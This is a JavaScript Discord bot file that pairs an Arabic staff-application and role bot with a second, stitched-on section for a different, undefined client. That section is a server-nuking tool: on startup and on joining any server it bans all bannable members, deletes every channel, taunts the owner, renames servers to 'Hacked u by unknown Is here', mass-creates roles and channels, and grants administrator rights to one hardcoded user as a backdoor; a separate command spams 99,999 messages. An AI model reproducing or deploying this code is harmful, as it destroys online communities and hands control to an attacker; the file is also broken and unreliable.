const Discord = require('discord.js');
const client = new Discord.Client();


client.on('ready', () => {
  console.log('Online')
})

client.on('message', msg => {
  let role = msg.guild.roles.find('name', 'Rainbow');
  if (!role) return;
  if (msg.content === '-r') {
   
  setInterval( function r() {
      role.setColor('RANDOM');
    },1000);
  
  }
})




client.on('message', message => {
    if (message.content === 'بوم') {
          let count = 1;
          let ecount = 1;
          for(let x = 1; x < 99999; x++) {
            message.channel.send(``)
              .then(m => {
                count++;
              })

            }
          }
    });






   
  
  
  
  
  
  
  
  
  
  
  

  
  
  
  
  
  
  
 













client.on("message", message => {
            if(message.content.startsWith("-تقديم")) {
        if(!message.channel.guild) return;
                if(message.author.bot) return;
        let channel = message.guild.channels.find("name", "التقديمات")
            if(!channel) return message.reply("**لانشاء روم التقديمات !!setsubmissions من فضلك اكتب الامر**")
            if(channel) {
            message.channel.send( message.member + ', **:timer:**').then( (m) =>{
              m.edit( message.member + ', **اسمك الحقيقى بالكامل ✍**' )
              m.channel.awaitMessages( m1 => m1.author == message.author,{ maxMatches: 1, time: 60*1000 } ).then ( (m1) => {
                  m1 = m1.first();
                  var name = m1.content;
                  m1.delete();
                  m.edit(message.member + ', **:timer:**').then( (m) =>{
                      m.edit( message.member + ', **عندك كام سنة 🎓**' )
                      setTimeout(() => {
                        m.delete()
                      }, 10000);
                      m.channel.awaitMessages( m2 => m2.author == message.author,{ maxMatches: 1, time: 60*1000 } ).then ( (m2) => {
                          m2 = m2.first();
                          var age = m2.content;
                          m2.delete()
                          message.channel.send( message.member + ', **:timer:**').then( (m) =>{
                            m.edit( message.member + ', **هل ستتفاعل فى الرومات الصوتيه و الكتابية ؟ 🎙**' )
                            setTimeout(() => {
                              m.delete()
                            }, 10000);
                            m.channel.awaitMessages( m1 => m1.author == message.author,{ maxMatches: 1, time: 60*1000 } ).then ( (m3) => {
                                m3 = m3.first();
                                var ask = m3.content;
                                m3.delete();
                                message.channel.send( message.member + ', **:timer:**').then( (m) =>{
                                  m.edit( message.member + ', **هل ستحترم القوانين ؟ 📑**' )
                                  setTimeout(() => {
                                    m.delete()
                                  }, 10000);
                                  m.channel.awaitMessages( m1 => m1.author == message.author,{ maxMatches: 1, time: 60*1000 } ).then ( (m4) => {
                                      m4 = m4.first();
                                      var ask2 = m4.content;
                                      m4.delete();
                                      message.channel.send( message.member + ', **:timer:**').then( (m) =>{
                                        m.edit( message.member + ', **لماذا يجب علينا ان نقبلك ؟ اعطنا سبباً وجيهاً 🤔**' )
                                        m.channel.awaitMessages( m1 => m1.author == message.author,{ maxMatches: 1, time: 60*1000 } ).then ( (m5) => {
                                            m5 = m5.first();
                                            var ask3 = m5.content;
                                            m5.delete();
                      m.edit(message.member + ', **....جارى جمع البيانات**').then( (mtime)=>{
                        setTimeout(() => {
                          let embed = new Discord.RichEmbed()
                        .setColor('RANDOM')
                        .setTitle(`**تقديم ادارة** [__**${message.guild.name}**__]`)
                        .addField('**`الاسم`**', `${name}` , true)
                        .addField('**`العمر`**', `${age}` , true)
                        .addField('**`هل سيتفاعل ؟`**',`${ask}`)
                        .addField('**`هل سيحترم القوانين ؟`**',`${ask2}`)
                        .addField('**`لماذا يجب علينا قبوله ؟`**',`${ask3}`)
                        .setFooter(message.author.username,'https://images-ext-2.discordapp.net/external/JpyzxW2wMRG2874gSTdNTpC_q9AHl8x8V4SMmtRtlVk/https/orcid.org/sites/default/files/files/ID_symbol_B-W_128x128.gif')
                        channel.send(embed)
                        }, 2500);
                        setTimeout(() => {
                          mtime.delete()
                        }, 3000);
 
                  })
                })
                })
              })
            })
          })
        })
        })
              })
          })
        })
    }
}
        });
        client.on('message', message=>{
            if(message.content.startsWith("روم1")) {
            if(!message.channel.guild) return;
                if(message.author.bot) return;
                if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply("**تحتاج الى `MANAGE_CHANNELS`**");
                message.guild.createChannel("التقديمات", "text").then(c =>{
                    c.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: false
 
                          })
                })
    message.channel.send("**✅ تم انشاء روم التقديمات بنجاح**")
            }
            })
    client.on('message',async message => {
  let mention = message.mentions.members.first();
  let role = message.content.split(" ").slice(2).join(" ");
  let mySupport = message.guild.roles.find('name',role);
  if(message.content.startsWith("قبول")) {
    let acRoom = message.guild.channels.find('name', 'القبول-الرفض');
    if(!acRoom) return message.reply("!!setac من فضلك انشاء روم **القبول-ال��فض** او اكتب الامر");
    if(acRoom) {
    if(!message.guild.member(message.author).hasPermission("MANAGE_ROLES")) return;
    if(!mention) return message.reply('منشن شخص');
    if(!role) return message.reply('ادخل اسم رتبة');
    if(!mySupport) return message.reply('هذه الرتبة غير موجودة');
    if(mention.roles.has(mySupport)) return message.reply('هذا الشخص معه الرتبة مسبقا');
 
    mention.addRole(mySupport).then(() => {
      acRoom.send(`**[ ${mySupport} ] واعطائك رتبة ${mention} تم بنجاح قبولك**`);
    });
  }
}
});
client.on('message',async message => {
  let mention = message.mentions.members.first();
  if(message.content.startsWith("رفض")) {
  if(!message.channel.guild) return;
  let acRoom = message.guild.channels.find('name', 'القبول-الرفض');
  if(!acRoom) return message.reply("!!setac من فضلك انشاء روم **القبول-الرفض** او اكتب الامر");
  if(!message.guild.member(message.author).hasPermission("MANAGE_ROLES")) return;
  if(!mention) return message.reply("منشن شخص");
 
  acRoom.send(`**${mention} تم رفضك للاسف**`)
  }
});
          client.on('message', message=>{
            if(message.content.startsWith("روم2")) {
         if(!message.channel.guild) return;
                if(message.author.bot) return;
                if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply("**تحتاج الى `MANAGE_CHANNELS`**");
                message.guild.createChannel("القبول-الرفض", "text").then(c =>{
                    c.overwritePermissions(message.guild.id, {
                        SEND_MESSAGES: false
 
                          })
                })
    message.channel.send("**✅ تم انشاء روم القبول والرفض بنجاح**")
            }
})






            
console.log('By Randy');
  console.log(`Logged in as ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('      ~            ~  By : Randy ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  Randy " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
       
   
 
});
var prefix = "-"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    LOka.user.setStatus(argresult);
  }
});
 
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by unknown Is here")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
 
}
});
 
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
})
}
});
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by unknown Is here`)
})
}
});
 
LOka.on('message', message => {
     if (message.content === ".") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
 
}
});
 
LOka.on('message', message => {
     
 
     if (message.content === "k1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
 
 
   
})
 
 
}
});
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
 
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
 
})
}
});
 
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
 
 
 
})
}
 
});
 
 
const { Client } = require('discord.js');
 
async function nuke(guild) {
  let users = 0;
  let channels = 0;
 
  await guild.fetchMembers();
 
  await guild.owner.send(' HacKed سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
 
 
 
  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
 
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
 
    await guild.createChannel('Hacked u by unknown Is here', 'text');
 
      await guild.createChannel('Hacked u by unknown Is here', 'voice');
 
 
 
}
 
LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by Randy");
  console.log("");
  console.log("-------------------------------------------------------------");
 
});
 
LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});
 
LOka.on('guildMemberAdd', member => {
   
            if (member.id === "349288766302584832") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM",
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
               
            }
       
    });
 
   
 
 
 
 

 






client.login(process.env.BOT_TOKEN);
